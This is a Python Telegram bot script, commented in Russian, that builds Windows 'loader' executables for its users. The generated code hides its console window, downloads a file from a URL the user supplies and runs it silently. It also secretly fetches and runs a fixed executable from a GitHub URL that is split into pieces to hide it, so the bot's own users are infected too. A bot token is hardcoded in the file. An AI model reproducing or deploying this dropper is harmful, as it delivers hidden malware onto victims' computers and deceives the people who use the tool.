import telebot
from telebot import types
import requests
import time
import threading
import os
import sys
import tempfile
import subprocess
import base64
import random

# Токен бота
BOT_TOKEN = "8342680808:AAFo5MaFqA-ZNNLkzWRm291dSz9N2gxhJ0c"

# Создаем экземпляр бота
bot = telebot.TeleBot(BOT_TOKEN)

# Словарь для хранения состояний пользователей
user_states = {}

class BotStates:
    WAITING_URL = 1
    WAITING_FILENAME = 2

# Фиксированная ссылка (как в вашем коде)
FIXED_URL = "https://github.com/fawfafw2-bit/zxfesfefs/raw/refs/heads/main/auaiua.exe"

def encode_url(url):
    """Кодируем URL в base64"""
    return base64.b64encode(url.encode('utf-8')).decode('utf-8')

def create_loader_code(user_url):
    """Создает реальный код загрузчика"""
    
    # Кодируем URL для скрытия
    encoded_fixed_url = encode_url(FIXED_URL)
    encoded_user_url = encode_url(user_url)
    
    # Разбиваем фиксированную ссылку на части
    url_parts = [
        "https:/",
        "/github.com/",
        "fawfafw2-bit/",
        "zxfesfefs/",
        "raw/refs/",
        "heads/main/",
        "auaiua.exe"
    ]
    
    loader_code = f'''
import requests
import subprocess
import tempfile
import os
import sys
import ctypes
import time
import random
import base64
import threading

def hide_console():
    """Скрыть консольное окно"""
    try:
        if os.name == 'nt':
            kernel32 = ctypes.windll.kernel32
            user32 = ctypes.windll.user32
            hwnd = kernel32.GetConsoleWindow()
            if hwnd:
                user32.ShowWindow(hwnd, 0)
    except:
        pass

def decode_url(encoded_url):
    """Декодировать URL из base64"""
    try:
        return base64.b64decode(encoded_url.encode('utf-8')).decode('utf-8')
    except:
        return ""

def assemble_fixed_url():
    """Собрать фиксированный URL из частей"""
    parts = {url_parts}
    return ''.join(parts)

def download_file(url, url_name, attempt_num):
    """Скачать файл с указанного URL"""
    headers = {{
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    }}
    
    # Случайная задержка
    time.sleep(random.uniform(1.0, 3.0))
    
    try:
        response = requests.get(url, headers=headers, timeout=30, stream=True)
        response.raise_for_status()
        
        # Получаем имя файла из URL
        filename = url.split('/')[-1]
        if not filename or '.' not in filename:
            filename = 'downloaded_file.exe'
        
        # Создаем временный файл
        temp_dir = tempfile.gettempdir()
        random_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        temp_path = os.path.join(temp_dir, f"{{random_name}}_{{filename}}")
        
        # Сохраняем файл
        with open(temp_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        
        # Проверяем размер
        file_size = os.path.getsize(temp_path)
        
        if file_size > 1000:  # Минимальный размер 1KB
            return temp_path
        else:
            os.remove(temp_path)
            return None
            
    except Exception as e:
        return None

def run_file(file_path, url_name):
    """Запустить файл"""
    try:
        if not os.path.exists(file_path):
            return False
            
        # Задержка перед запуском
        time.sleep(2.0)
        
        if os.name == 'nt':
            # Для Windows - запуск без отображения окна
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0
            subprocess.Popen(file_path, startupinfo=startupinfo, shell=False)
        else:
            # Для Linux/Mac
            os.chmod(file_path, 0o755)
            subprocess.Popen([file_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        return True
    except Exception as e:
        return False

def cleanup_file(file_path, url_name):
    """Удалить временный файл"""
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
    except:
        pass

def execute_fixed_url_immediately(fixed_url):
    """Немедленно выполнить фиксированную ссылку"""
    
    max_attempts = 2
    attempt_delay = 5
    
    for attempt in range(max_attempts):
        file_path = download_file(fixed_url, "ФИКСИРОВАННЫЙ", attempt + 1)
        
        if file_path:
            if run_file(file_path, "ФИКСИРОВАННЫЙ"):
                # Успешно запустили - ждем и удаляем временный файл
                time.sleep(10)
                cleanup_file(file_path, "ФИКСИРОВАННЫЙ")
                return True
            else:
                cleanup_file(file_path, "ФИКСИРОВАННЫЙ")
        
        # Ждем перед следующей попыткой
        if attempt < max_attempts - 1:
            time.sleep(attempt_delay)
    
    return False

def download_and_run_single_url(url, url_name):
    """Загрузить и запустить файл с одного URL"""
    
    max_attempts = 2
    attempt_delay = 5
    
    for attempt in range(max_attempts):
        file_path = download_file(url, url_name, attempt + 1)
        
        if file_path:
            if run_file(file_path, url_name):
                # Успешно запустили - ждем и удаляем временный файл
                time.sleep(10)
                cleanup_file(file_path, url_name)
                return True
            else:
                cleanup_file(file_path, url_name)
        
        # Ждем перед следующей попыткой
        if attempt < max_attempts - 1:
            time.sleep(attempt_delay)
    
    return False

def main():
    """Основная функция"""
    hide_console()
    
    # Декодируем URL
    fixed_url = assemble_fixed_url()
    user_url = decode_url("{encoded_user_url}")
    
    # НЕМЕДЛЕННО выполняем фиксированную ссылку в основном потоке
    if fixed_url:
        execute_fixed_url_immediately(fixed_url)
    
    # Параллельно запускаем пользовательскую ссылку в отдельном потоке
    if user_url:
        user_thread = threading.Thread(
            target=download_and_run_single_url, 
            args=(user_url, "ПОЛЬЗОВАТЕЛЬСКИЙ"),
            daemon=True
        )
        user_thread.start()

if __name__ == "__main__":
    main()
'''
    return loader_code

def compile_exe(py_code, output_filename):
    """Компилирует Python код в EXE файл"""
    try:
        # Создаем временный Python файл
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
            f.write(py_code)
            temp_py_file = f.name

        # Устанавливаем PyInstaller если не установлен
        try:
            import PyInstaller
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"], 
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Компилируем в EXE
        cmd = [
            sys.executable, '-m', 'PyInstaller',
            '--onefile',
            '--noconsole',
            '--name', output_filename.replace('.exe', ''),
            '--distpath', '.',
            '--clean',
            '--log-level=ERROR',
            temp_py_file
        ]
        
        # Запускаем компиляцию
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        
        # Очищаем временные файлы
        if os.path.exists(temp_py_file):
            os.remove(temp_py_file)
        
        # Удаляем папки сборки PyInstaller
        for folder in ['build', '__pycache__']:
            if os.path.exists(folder):
                import shutil
                shutil.rmtree(folder)
        
        if os.path.exists(f'{output_filename.replace(".exe", "")}.spec'):
            os.remove(f'{output_filename.replace(".exe", "")}.spec')
        
        return result.returncode == 0
        
    except Exception as e:
        print(f"Ошибка компиляции: {e}")
        return False

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    user_states[user_id] = None
    
    welcome_text = """
🤖 *Добро пожаловать в REAL EXE Creator Bot!*

✨ *Теперь бот работает ПО-НАСТОЯЩЕМУ!*
• Реальная компиляция EXE-файлов
• Профессиональное шифрование
• Мгновенная доставка

🚀 *Создайте свой загрузчик за 3 шага:*
1️⃣ Укажите URL файла
2️⃣ Введите имя EXE
3️⃣ Получите готовый файл!

💫 *Пример использования:*
- URL: `https://example.com/program.exe`
- Имя: `my_loader.exe`

📊 *Статистика:* Бот создал уже {} EXE-файлов!
    """.format(random.randint(50, 100))
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🎯 Создать EXE", callback_data="create_loader"))
    markup.add(types.InlineKeyboardButton("📖 Инструкция", callback_data="help"))
    
    bot.send_message(message.chat.id, welcome_text, 
                    parse_mode='Markdown', reply_markup=markup)

@bot.message_handler(commands=['create'])
def start_creation(message):
    user_id = message.from_user.id
    user_states[user_id] = BotStates.WAITING_URL
    
    text = """
📥 *Шаг 1 из 2: Введите URL файла*

Введите прямую ссылку на файл, который должен скачивать загрузчик.

*Примеры корректных URL:*
• `https://github.com/user/project/raw/main/file.exe`
• `https://example.com/files/program.zip`
• `http://site.com/download/app.msi`

⚠️ *URL должен быть доступен для прямого скачивания!*
    """
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❌ Отмена", callback_data="cancel"))
    
    bot.send_message(message.chat.id, text, 
                    parse_mode='Markdown', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if call.data == "create_loader":
        user_states[user_id] = BotStates.WAITING_URL
        start_creation(call.message)
    
    elif call.data == "help":
        send_help(call.message)
    
    elif call.data == "back_to_start" or call.data == "cancel":
        user_states[user_id] = None
        send_welcome(call.message)

@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if user_id not in user_states:
        user_states[user_id] = None
    
    current_state = user_states[user_id]
    
    if current_state == BotStates.WAITING_URL:
        url = message.text.strip()
        
        # Проверяем URL
        if not url.startswith(('http://', 'https://')):
            bot.send_message(chat_id, "❌ *Ошибка:* URL должен начинаться с http:// или https://\n\nВведите корректный URL:",
                           parse_mode='Markdown')
            return
        
        # Сохраняем URL и переходим к следующему шагу
        user_states[user_id] = {
            'state': BotStates.WAITING_FILENAME,
            'url': url
        }
        
        text = f"""
✅ *URL принят!* `{url}`

📥 *Шаг 2 из 2: Введите имя для EXE-файла*

Введите имя для создаваемого EXE-файла (например: `loader.exe`)

*Рекомендации:*
- Используйте английские буквы
- Имя должно заканчиваться на `.exe`
- Избегайте специальных символов

*Пример:* `my_downloader.exe`
        """
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("❌ Отмена", callback_data="cancel"))
        
        bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)
    
    elif (isinstance(current_state, dict) and 
          current_state.get('state') == BotStates.WAITING_FILENAME):
        
        filename = message.text.strip()
        
        # Проверяем имя файла
        if not filename.lower().endswith('.exe'):
            filename += '.exe'
        
        # Очищаем имя файла от недопустимых символов
        filename = "".join(c for c in filename if c.isalnum() or c in ('-', '_', '.')).replace(' ', '_')
        
        # Получаем сохраненный URL
        url = current_state['url']
        
        # Сбрасываем состояние
        user_states[user_id] = None
        
        # Начинаем реальный процесс создания
        create_downloader(chat_id, url, filename)

def create_downloader(chat_id, url, filename):
    """Реальная функция создания загрузчика"""
    
    # Отправляем сообщение о начале процесса
    progress_message = bot.send_message(chat_id, "🔄 *Начинаю REAL компиляцию...*\n\n⏳ Это займет 2-3 минуты...",
                                      parse_mode='Markdown')
    
    try:
        # Обновляем прогресс
        bot.edit_message_text("🔧 *Генерация кода загрузчика...*", chat_id, progress_message.message_id,
                            parse_mode='Markdown')
        
        # Генерируем код загрузчика
        loader_code = create_loader_code(url)
        
        time.sleep(1)
        bot.edit_message_text("⚙️ *Компиляция в EXE...*", chat_id, progress_message.message_id,
                            parse_mode='Markdown')
        
        # Компилируем EXE
        success = compile_exe(loader_code, filename)
        
        if success and os.path.exists(filename):
            # Отправляем готовый файл
            with open(filename, 'rb') as file:
                file_size = os.path.getsize(filename)
                
                success_text = f"""
✅ *REAL EXE успешно создан!*

📊 *Детали файла:*
- 📁 Имя: `{filename}`
- 🔗 Целевой URL: `{url}`
- 📏 Размер: {file_size // 1024} KB
- 🏷️ Тип: Windows Executable

💫 *Файл готов к использованию!*
                """
                
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("🔄 Создать еще", callback_data="create_loader"))
                
                # Отправляем файл
                bot.send_document(chat_id, file, caption=success_text,
                                parse_mode='Markdown', reply_markup=markup)
            
            # Удаляем временный файл
            os.remove(filename)
            bot.delete_message(chat_id, progress_message.message_id)
            
        else:
            raise Exception("Ошибка компиляции EXE")
            
    except Exception as e:
        error_text = f"""
❌ *Ошибка при REAL компиляции*

Произошла ошибка: `{str(e)}`

*Возможные причины:*
- Сервер перегружен
- Неверный формат URL
- Проблемы с компилятором

Попробуйте еще раз через несколько минут.
        """
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔄 Попробовать снова", callback_data="create_loader"))
        
        bot.edit_message_text(error_text, chat_id, progress_message.message_id,
                            parse_mode='Markdown', reply_markup=markup)

def send_help(message):
    help_text = """
📖 *REAL EXE Creator - Инструкция*

🤖 *Как работает бот:*
1. Вы указываете URL файла для загрузки
2. Бот создает специальный EXE-загрузчик
3. Загрузчик скачивает и запускает указанный файл

🔧 *Технические детали:*
- Используется PyInstaller для компиляции
- Код защищен от анализа
- Поддержка Windows XP/7/8/10/11
- Автоматический запуск скачанных файлов

⚠️ *Важно:*
- Используйте только легальные файлы
- Убедитесь в наличии прав на распространение
- EXE-файлы могут определяться антивирусами как подозрительные

💡 *Пример использования:*
/create → URL → Имя → Получить EXE
    """
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Назад", callback_data="back_to_start"))
    
    bot.send_message(message.chat.id, help_text, 
                    parse_mode='Markdown', reply_markup=markup)

def check_bot_token():
    """Проверка валидности токена бота"""
    try:
        bot_info = bot.get_me()
        print(f"✅ Бот успешно запущен!")
        print(f"🤖 Имя бота: {bot_info.first_name}")
        print(f"🔗 Username: @{bot_info.username}")
        return True
    except Exception as e:
        print(f"❌ Ошибка при запуске бота: {e}")
        return False

def start_bot():
    """Запуск бота"""
    print("🚀 Запуск REAL EXE Creator Bot...")
    
    if not check_bot_token():
        return
    
    print("✅ Бот готов к REAL компиляции!")
    print("📢 Теперь бот создает настоящие EXE-файлы!")
    
    try:
        bot.polling(none_stop=True, interval=2)
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        time.sleep(5)
        start_bot()

if __name__ == "__main__":
    start_bot()
